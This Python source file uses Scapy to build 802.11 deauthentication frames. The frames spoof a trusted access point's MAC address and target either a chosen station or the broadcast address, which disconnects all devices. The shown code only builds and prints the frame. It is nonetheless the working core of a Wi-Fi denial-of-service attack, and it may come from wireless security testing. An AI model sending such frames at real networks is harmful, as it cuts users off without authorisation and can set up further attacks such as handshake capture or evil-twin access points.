from scapy.all import *
from scapy.layers.dot11 import *

with open("devices.json", "r") as file:
    data = json.load(file)

# SSH Configuration
AP_MAC = data["TrustedAP"][0]["mac"]

def deassociation_frame(target_mac):
    # Create a deauthentication frame
    frameFCS = ( 
        Dot11FCS(
            proto = 0,
            type=0,
            subtype=12,
            FCfield = None,
            addr1=target_mac,
            addr2=AP_MAC,
            addr3=AP_MAC,
            SC=(1 << 4)
            ) /
        Dot11Deauth(reason=3)
    )

    print("Generated Deassociation Frame:")
    print(frameFCS.show())

    return bytes(frameFCS)

def start_deauthentication_frame_generator():
    print("\nstart deauthentication frame generator")
    use_defaults = input("use default values for STA? (deauthentication all devices) (y/n): ")

    while(use_defaults not in ["y", "n"]):
        use_defaults = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
    
    if use_defaults == "y":
        STA_mac = "FF:FF:FF:FF:FF:FF"    
    elif use_defaults == "n":
        STA_mac = input("Enter the STA MAC address: ")


    raw_frame = deassociation_frame(STA_mac)

    return raw_frame